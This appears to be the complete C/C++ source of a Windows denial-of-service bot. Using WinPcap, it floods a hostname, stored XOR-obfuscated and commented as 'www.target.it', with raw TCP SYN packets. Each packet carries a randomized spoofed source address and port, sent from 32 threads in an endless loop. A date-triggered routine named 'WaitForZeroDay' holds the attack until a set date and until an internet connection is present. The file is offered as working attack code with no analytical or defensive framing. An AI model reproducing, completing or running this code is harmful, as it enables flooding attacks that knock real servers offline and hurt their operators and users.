#define HAVE_REMOTE
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <WinInet.h>
#include <pcap\pcap.h>
#include <remote-ext.h>
#include <string>
#include <winternl.h>
#include <iphlpapi.h>

#pragma comment (lib,"iphlpapi.lib")
#pragma comment (lib,"ws2_32.lib")
#pragma comment (lib,"Wininet.lib")
#pragma pack(1)

#define MAC_LENGTH			32
#define SIZE_PACKET			65536
#define THREAD_COUNT		32

#define MAX_TTL				255

#define TARGET_PORT			0

#define RANDOMIZE_IP(ip)				\
		ip[0] = (rand() % 255) + 1;		\
		ip[1] = rand() % 256;			\
		ip[2] = rand() % 256;			\
		ip[3] = rand() % 256;

#define RANDOMIZE_PORT(port)		\
		port = htons(rand() % 65535) + 1;

#define YEAR			2001
#define MONTH			9
#define DAY				11
#define	YEAR_OFFSET		1900

#define TARGET_SERVER	"\x31\x23\x33\xc5\x8e\x84\x7c\xd8\xe9\xc1\x77\xaa\xc4\xf3"

static HANDLE hThreads[THREAD_COUNT];

typedef enum
{
	off,
	on
}_BOOL;

typedef enum
{
	success_list_devices,
	failure_list_devices
}list_devices;

typedef enum
{
	host_resolved,
	host_not_resolved
}ip_host_state;

typedef struct _PACKET_DATA
{
	char* net_description;
	char* packet;
}PACKET_DATA, * PPACKET_DATA;

typedef struct _IPV4_HDR
{
	unsigned char ip_header_len : 4;		//Header length
	unsigned char ip_version : 4;			//4 bit IPv4 version
	unsigned char ip_tos;					//IP type of service
	unsigned short ip_total_lenght;			//Total lenght
	unsigned short ip_id;					//Unique identifier

	unsigned char ip_frag_offset : 5;		//Fragment offset field

	unsigned char ip_more_fragment : 1;
	unsigned char ip_dont_fragment : 1;
	unsigned char ip_reserved_zero : 1;

	unsigned char ip_frag_offset1;			//Fragment offset

	unsigned char ip_ttl;					//Time to live
	unsigned char ip_protocol;				//Protocol(TCP | UDP | ICMP etc..)
	unsigned short ip_checksum;				//IP checksum
	unsigned int ip_srcaddr;				//Source address
	unsigned int ip_destaddr;				//Destination address
}IPV4_HDR, * PIPV4_HDR;

typedef struct _UDP_HDR
{
	unsigned short source_port;				//Source port
	unsigned short dest_port;				//Destination port
	unsigned short udp_length;				//UDP packet length
	unsigned short udp_checksum;			//UDP checksum(opt)
}UDP_HDR, * PUDP_HDR;

typedef struct _TCP_HDR
{
	unsigned short source_port;				//Source port
	unsigned short dest_port;				//Dest port
	unsigned int sequence;					//Sequence number - 32 bits
	unsigned int acknowledge;				//Acknowledge number - 32 bits

	unsigned char ns : 1;					//Nonce sumflag added in RFC 3540
	unsigned char reserved_part1 : 3;		//According to rfc
	unsigned char data_offset : 4;			/*   The number of 32 bit words in the TCP header
												 This indicats where the data begins
											*/
	unsigned char fin : 1;					//Finish flag
	unsigned char syn : 1;					//Synchronise flag
	unsigned char rst : 1;					//Reset flag
	unsigned char psh : 1;					//Push flag
	unsigned char ack : 1;					//Acknowledgement flag
	unsigned char urg : 1;					//Echo flag

	unsigned char ecn : 1;					//ECN_Echo
	unsigned char cwr : 1;					//Congestion Window Reduced Flag

	unsigned short window;					//Window
	unsigned short checksum;				//Checksum
	unsigned short urgent_pointer;			//Urgent pointer
}TCP_HDR, * PTCP_HDR;

typedef struct _ETHERNET_HDR
{
	unsigned char dest[6];			//Mac of gateway
	unsigned char source[6];		//Mac of interface
	USHORT type;					//IP, ARP, ICMP..
}ETHERNET_HDR, *PETHERNET_HDR;

void WaitForInternetConnection();
void WaitForZeroDay();
list_devices find_devices(pcap_if_t** devices);
void xor_decrypt(char* buffer);
void payload(const pcap_if_t* devices);
char** init_packet(in_addr address);

void send_packet(
	const char* net_description,
	const char* packet
);

DWORD WINAPI SYNProcedure(
	LPVOID lpParams
);

void init_ethernet_header(
	ETHERNET_HDR* ethernet_hdr,
	BYTE* MACGateway,
	BYTE* MACInterface
);

void init_ipv4_header(
	IPV4_HDR* ipv4_hdr,
	const char* dest_address
);

void init_tcp_header(
	IPV4_HDR* ipv4_hdr,
	TCP_HDR* tcp_hdr
);

_BOOL GetMAC(
	const char* ip,
	BYTE* MacRet
);

_BOOL GetGateway(
	const in_addr ip,
	std::string& Address
);

UINT16 tcpsum(
	IPV4_HDR* IpHdr,
	TCP_HDR* TcpHdr
);

UINT16 csum(
	UINT16* buffer,
	INT count
);

void fatal();

int main()
{
	pcap_if_t* all_devices = NULL;

	SecureZeroMemory(hThreads, sizeof(hThreads));
	WaitForZeroDay();
	WaitForInternetConnection();
	
	if (find_devices(&all_devices) == list_devices::failure_list_devices)
		fatal();

	payload(all_devices);
	pcap_freealldevs(all_devices);

	ExitProcess(EXIT_SUCCESS);
}

void WaitForInternetConnection()
{
	DWORD dwState = 0;
	while (!InternetGetConnectedState(&dwState, 0));
}

void WaitForZeroDay()
{
	time_t data_time = 0;
	struct tm* ptm = NULL;
	_BOOL is_zero_day = off;

	while (is_zero_day == 0)
	{
		time(&data_time);
		ptm = localtime(&data_time);
		if ((ptm->tm_year + YEAR_OFFSET) > YEAR)
			is_zero_day = on;
		else if ((ptm->tm_year + YEAR_OFFSET) == YEAR && ptm->tm_mon > MONTH)
			is_zero_day = on;
		else if ((ptm->tm_year + YEAR_OFFSET) == YEAR && ptm->tm_mon == MONTH && ptm->tm_mday >= DAY)
			is_zero_day = on;
		Sleep(350);
	}

	return;
}

list_devices find_devices(
	pcap_if_t** devices
)
{
	char error[PCAP_ERRBUF_SIZE];
	SecureZeroMemory(error, sizeof(char) * PCAP_ERRBUF_SIZE);
	
	if (pcap_findalldevs_ex(
		(char*)PCAP_SRC_IF_STRING,
		NULL,
		*(&devices),
		error
	) == PCAP_ERROR)
		return list_devices::failure_list_devices;

	return list_devices::success_list_devices;
}

void xor_decrypt(
	char* buffer
)
{
	unsigned char key = 0xef;
	unsigned long long int len = strlen(buffer);
	unsigned long long int i = 0;

	for (; i < len; ++i)
		buffer[i] = buffer[i] ^ key;
}

void payload(
	const pcap_if_t* devices
)
{
	char** packet = NULL;

	/*For each device*/
	for (const pcap_if_t* index = devices; index; index = index->next)
	{
		/*For each address*/
		for (pcap_addr_t* pcap_addr_obj = index->addresses; pcap_addr_obj; pcap_addr_obj = pcap_addr_obj->next)
		{
			sockaddr_in* sockaddr_obj = (sockaddr_in*)pcap_addr_obj->addr;

			/*Is a valid address*/
			if (sockaddr_obj->sin_addr.S_un.S_addr)
			{
				packet = init_packet(sockaddr_obj->sin_addr);
				if (packet)
				{
					/*For each server*/
					for (int i = 0; packet[i]; ++i)
					{
						send_packet(index->name, packet[i]);
					}
				}
			}
		}
	}

	WaitForMultipleObjects(THREAD_COUNT, hThreads, TRUE, INFINITE);

	if (packet)
	{
		for (int i = 0; packet[i]; ++i)
			free(packet[i]);
		free(packet);
	}

	return;
}

char** init_packet(
	in_addr in_addr_obj_arg
)
{
	char** packet = NULL;
	char* source_address = NULL;
	char buffer[] = TARGET_SERVER;		//www.target.it
	std::string IpGateway;

	BYTE MacInterface[MAC_LENGTH];
	BYTE MacGateway[MAC_LENGTH];

	in_addr address_interface;
	in_addr in_addrobj;
	hostent* host_info = NULL;

	ETHERNET_HDR* ethernet_hdr = NULL;
	IPV4_HDR* ipv4_hdr = NULL;
	TCP_HDR* tcp_hdr = NULL;

	//Number of server to attack
	int num_of_server = 0;

	SecureZeroMemory(MacInterface, sizeof(BYTE)* MAC_LENGTH);
	SecureZeroMemory(MacGateway, sizeof(BYTE)* MAC_LENGTH);
	SecureZeroMemory(&address_interface, sizeof(in_addr));
	SecureZeroMemory(&in_addrobj, sizeof(in_addr));

	//Don't release this object
	source_address = (char*)malloc(sizeof(char) * strlen(inet_ntoa(in_addr_obj_arg)) + sizeof(char));

	if (source_address != NULL)
	{
		strcpy(source_address, inet_ntoa(in_addr_obj_arg));
		address_interface.s_addr = inet_addr(source_address);

		if (GetMAC(source_address, MacInterface) != NULL)
		{
			if (GetGateway(address_interface, IpGateway) != NULL)
			{
				if (GetMAC(IpGateway.c_str(), MacGateway) != NULL)
				{
					xor_decrypt(buffer);

					host_info = gethostbyname(buffer);
					if (host_info != NULL)
					{
						//Select number of server
						for (num_of_server = 0; host_info->h_addr_list[num_of_server]; ++num_of_server);

						packet = (char**)calloc((size_t)(num_of_server + (size_t)1), sizeof(char*));

						if (packet != NULL)
						{
							for (int i = 0; i < num_of_server; ++i)
							{
								char* dest_address = NULL;
								packet[i] = (char*)malloc(SIZE_PACKET);

								if (packet[i] != NULL)
								{
									in_addrobj.s_addr = in_addrobj.s_addr = *(unsigned long*)host_info->h_addr_list[i];
									dest_address = (char*)malloc(sizeof(char) * strlen(inet_ntoa(in_addrobj)) + sizeof(char));

									if (dest_address != NULL)
									{
										strcpy(dest_address, inet_ntoa(in_addrobj));
										ethernet_hdr = (ETHERNET_HDR*)packet[i];
										init_ethernet_header(ethernet_hdr, MacGateway, MacInterface);
										ipv4_hdr = (IPV4_HDR*)(packet[i] + sizeof(ETHERNET_HDR));
										init_ipv4_header(ipv4_hdr, dest_address);
										tcp_hdr = (TCP_HDR*)(packet[i] + sizeof(ETHERNET_HDR) + sizeof(IPV4_HDR));
										init_tcp_header(ipv4_hdr, tcp_hdr);

										free(dest_address);
									}
									else
									{
										fatal();
									}
								}
								else
								{
										fatal();
								}
							}
						}
					}
				}
			}
		}

		free(source_address);
	}

	return packet;
}

void send_packet(
	const char* net_description,
	const char* packet
)
{
	static PACKET_DATA data;
	size_t net_length = (size_t)strlen(net_description);

	SecureZeroMemory(&data, sizeof(data));
	data.packet = (char*)packet;
	data.net_description = (char*)malloc(sizeof(char) * net_length + sizeof(char));
	
	if (data.net_description != NULL)
	{
		SecureZeroMemory(data.net_description, sizeof(char) * net_length + sizeof(char));
		memcpy(data.net_description, net_description, net_length * sizeof(char));

		for (int i = 0; i < THREAD_COUNT; ++i)
		{
			hThreads[i] = CreateThread(
				NULL,
				0,
				SYNProcedure,
				&data,
				NULL,
				NULL
			);
		}
	}
}

DWORD WINAPI SYNProcedure(
	LPVOID lpParams
)
{
	char error[PCAP_ERRBUF_SIZE];
	pcap_t* pcap_handle = NULL;
	PACKET_DATA* data = (PACKET_DATA*)lpParams;

	SecureZeroMemory(error, sizeof(char) * PCAP_ERRBUF_SIZE);

	pcap_handle = pcap_open(
		data->net_description,
		sizeof(ETHERNET_HDR) + sizeof(IPV4_HDR) + sizeof(TCP_HDR),
		PCAP_OPENFLAG_PROMISCUOUS,
		0,
		NULL,
		error
	);
	
	if (pcap_handle)
	{
		srand((unsigned int)time(NULL));

		while (1)
		{
			pcap_sendpacket(
				pcap_handle,
				(unsigned char*)data->packet,
				sizeof(ETHERNET_HDR) + sizeof(IPV4_HDR) + sizeof(TCP_HDR)
			);

			TCP_HDR* tcp_hdr = (TCP_HDR*)(data->packet + sizeof(ETHERNET_HDR) + sizeof(IPV4_HDR));
			IPV4_HDR* ipv4_hdr = (IPV4_HDR*)(data->packet + sizeof(ETHERNET_HDR));
			char* buf = (char*)&ipv4_hdr->ip_srcaddr;
			RANDOMIZE_IP(buf);
			RANDOMIZE_PORT(tcp_hdr->source_port);
		}

		pcap_close(pcap_handle);
	}

	return NO_ERROR;
}

void init_ethernet_header(
	ETHERNET_HDR* ethernet_hdr,
	BYTE* MACGateway,
	BYTE* MACInterface
)
{
	memcpy(ethernet_hdr->dest, MACGateway, 6);
	memcpy(ethernet_hdr->source, MACInterface, 6);
	ethernet_hdr->type = htons(0x800);
}

void init_ipv4_header(
	IPV4_HDR* ipv4_hdr,
	const char* dest_address
)
{
	char* buf = (char*)&ipv4_hdr->ip_srcaddr;

	ipv4_hdr->ip_version = 4;
	ipv4_hdr->ip_header_len = 5;
	ipv4_hdr->ip_tos = 0;
	ipv4_hdr->ip_total_lenght = htons(sizeof(IPV4_HDR) + sizeof(TCP_HDR));
	ipv4_hdr->ip_id = 2;
	ipv4_hdr->ip_frag_offset = 0;
	ipv4_hdr->ip_reserved_zero = 0;
	ipv4_hdr->ip_dont_fragment = 1;
	ipv4_hdr->ip_more_fragment = 0;
	ipv4_hdr->ip_frag_offset1 = 0;
	ipv4_hdr->ip_ttl = MAX_TTL;
	ipv4_hdr->ip_protocol = IPPROTO_TCP;
	RANDOMIZE_IP(buf);
	ipv4_hdr->ip_destaddr = inet_addr(dest_address);
	ipv4_hdr->ip_checksum = csum((unsigned short*)ipv4_hdr, sizeof(IPV4_HDR));

	return;
}

void init_tcp_header(
	IPV4_HDR* ipv4_hdr,
	TCP_HDR* tcp_hdr
)
{
	RANDOMIZE_PORT(tcp_hdr->source_port);
	tcp_hdr->dest_port = htons(TARGET_PORT);
	tcp_hdr->sequence = 0xffffffff;
	tcp_hdr->acknowledge = 0;
	tcp_hdr->reserved_part1 = 0;
	tcp_hdr->data_offset = 5;
	tcp_hdr->fin = 0;
	tcp_hdr->syn = 1;
	tcp_hdr->rst = 0;
	tcp_hdr->psh = 0;
	tcp_hdr->ack = 0;
	tcp_hdr->urg = 0;
	tcp_hdr->ecn = 0;
	tcp_hdr->cwr = 0;
	tcp_hdr->checksum = 0;
	tcp_hdr->urgent_pointer = 0;
	tcp_hdr->checksum = tcpsum(ipv4_hdr, tcp_hdr);

	return;
}

_BOOL GetMAC(
	const char* ip,
	BYTE* MacRet
)
{
	IPAddr Destination = inet_addr(ip);
	IPAddr Source = INADDR_ANY;
	ULONG Mac[2];
	ULONG MacLength = 6;
	_BOOL bStatus = off;
	memset(&Mac, 0xff, sizeof(Mac));

	SendARP(Destination, Source, &Mac, &MacLength);

	if (MacLength)
	{
		BYTE* pbPhysicalAddress = (BYTE*)&Mac;
		for (UINT i = 0; i < MacLength; ++i)
			MacRet[i] = pbPhysicalAddress[i];
		bStatus = on;
	}

	return bStatus;
}

_BOOL GetGateway(
	const in_addr ip,
	std::string& Address
)
{
	IP_ADAPTER_INFO* IpAdapterInfo = NULL;
	IP_ADAPTER_INFO* IpAdapter = NULL;
	ULONG dwSize = 0;
	_BOOL bStatus = off;

	IpAdapterInfo = new IP_ADAPTER_INFO[sizeof(IP_ADAPTER_INFO)];
	if (IpAdapterInfo)
	{
		if (GetAdaptersInfo(IpAdapterInfo, &dwSize) == ERROR_BUFFER_OVERFLOW)
		{
			delete[]IpAdapterInfo;
			IpAdapterInfo = new IP_ADAPTER_INFO[sizeof(IP_ADAPTER_INFO)];
			if (IpAdapterInfo)
			{
				if (GetAdaptersInfo(IpAdapterInfo, &dwSize) == NO_ERROR)
				{	
					for (IpAdapter = IpAdapterInfo; IpAdapter; IpAdapter = IpAdapter->Next)
					{
						if (ip.s_addr == inet_addr(IpAdapter->IpAddressList.IpAddress.String))
						{
							Address = IpAdapter->GatewayList.IpAddress.String;
							bStatus = on;
						}
					}
				}
				delete[]IpAdapterInfo;
			}
		}
	}

	return bStatus;
}

UINT16 csum(
	UINT16* buffer,
	INT count
)
{
	ULONG sum = 0;
	while (count > 1)
	{
		sum += *buffer++;
		count -= 2;
	}

	if (count > 0)
		sum += *(UCHAR*)buffer;

	while (sum >> 16)
		sum = (sum & 0xFFFF) + (sum >> 16);

	return (UINT16)~sum;
}

UINT16 tcpsum(
	IPV4_HDR* IpHdr,
	TCP_HDR* TcpHdr
)
{
	struct PseudoTcp
	{
		ULONG src_addr;
		ULONG dst_addr;
		UCHAR zero;
		UCHAR proto;
		USHORT length;
	}PseudoTcpHeader;

	USHORT total_length = IpHdr->ip_total_lenght;
	INT TotalTcpLength = sizeof(PseudoTcp) + sizeof(TCP_HDR);
	USHORT* tcp = new USHORT[TotalTcpLength];
	UINT16 ret = 0;

	PseudoTcpHeader.src_addr = IpHdr->ip_srcaddr;
	PseudoTcpHeader.dst_addr = IpHdr->ip_destaddr;
	PseudoTcpHeader.zero = 0;
	PseudoTcpHeader.proto = IPPROTO_TCP;
	PseudoTcpHeader.length = htons(sizeof(TCP_HDR));

	if (tcp != NULL)
	{
		memcpy((UCHAR*)tcp, &PseudoTcpHeader, sizeof(PseudoTcp));
		memcpy((UCHAR*)tcp + sizeof(PseudoTcpHeader), (UCHAR*)TcpHdr, sizeof(TCP_HDR));
		ret = csum(tcp, TotalTcpLength);
	}

	delete[]tcp;
	return ret;
}

void fatal()
{
	//fprintf(stderr, "fatal in %s. Error was %d. Program terminated!", what, GetLastError());
	ExitProcess(EXIT_FAILURE);
}
